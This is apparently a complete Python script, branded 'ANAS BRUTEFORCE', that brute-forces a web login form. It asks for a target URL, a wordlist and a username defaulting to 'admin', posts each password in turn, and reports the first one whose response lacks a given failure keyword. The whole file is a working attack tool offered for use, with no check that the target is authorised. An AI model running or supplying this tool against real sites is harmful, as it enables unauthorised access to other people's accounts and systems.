import requests
import time
import os

def main():
    os.system("clear")
    print('''
    \033[91m 
    █████╗ ███╗   ██╗ █████╗ ███████╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
   ██╔══██╗████╗  ██║██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
   ███████║██╔██╗ ██║███████║███████╗    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  		Anass Labrini
   ██╔══██║██║╚██╗██║██╔══██║╚════██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
   ██║  ██║██║ ╚████║██║  ██║███████║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
   \033[0m
''')

    # إدخال الرابط من المستخدم
    url = input("[+] Enter the target login URL (e.g. https://example.com/login.php): ").strip()
    if not url.startswith("http"):
        print("[✘] Invalid URL. Must start with http:// or https://")
        return

    # إدخال المسار إلى ملف كلمات المرور
    wordlist_path = input("[+] Enter the path to your wordlist file: ").strip()
    if not os.path.isfile(wordlist_path):
        print(f"[✘] Wordlist not found at: {wordlist_path}")
        return

    # اسم المستخدم الافتراضي هو admin
    username = input("[+] Enter the username (default: admin): ").strip()
    if username == "":
        username = "admin"

    # الكلمة المفتاحية للخطأ في الرد
    error_keyword = input("[+] Enter keyword shown on failed login (e.g. 'invalid', 'error'): ").strip().lower()
    if error_keyword == "":
        error_keyword = "invalid"

    # قراءة كلمات المرور من الملف
    with open(wordlist_path, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"\n[~] Starting brute force on {url} with user '{username}'\n")

    # تجربة كل كلمة مرور
    for password in passwords:
        data = {"username": username, "password": password}
        try:
            response = requests.post(url, data=data, timeout=10)
            if error_keyword in response.text.lower():
                print(f"[-] Incorrect: {username} | {password}")
            else:
                print(f"\n[✓] Found! --> Username: {username} | Password: {password}")
                break
        except Exception as e:
            print(f"[!] Request error: {e}")
        time.sleep(0.5)

if __name__ == "__main__":
    main()
